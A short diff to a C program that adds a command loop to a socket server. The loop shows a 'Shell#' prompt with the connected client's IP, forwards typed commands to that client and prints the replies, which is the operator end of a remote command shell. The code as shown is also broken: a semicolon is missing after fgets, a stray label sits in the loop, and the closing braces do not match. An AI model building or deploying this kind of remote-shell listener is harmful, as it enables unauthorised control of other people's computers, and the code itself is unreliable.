@@ -31,6 +31,24 @@ int main() {
 	listen(sock, 5);
 	client_length = sizeof(client_address);
 	client_socket= accept(sock, (struct sockaddr *) &client_address, &client_length);
+	
+	while(1){
+		jump:
+		bzero(&buffer, sizeof(buffer));
+		bzero(&response, sizeof(response));
+		printf("Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
+		fgets(buffer, sizeof(buffer), stdin)
+		strtok(buffer, "\n");
+		write(client_socket, buffer, sizeof(buffer));
+		if (strncmp("q", buffer, 1)==0){
+			break;
+		}
+		else {
+			recv(client_socket, response, sizeof(response), MSG_WAITALL);
+			printf("%s", response);
+		}
+
+
 	}
 
-
+	}
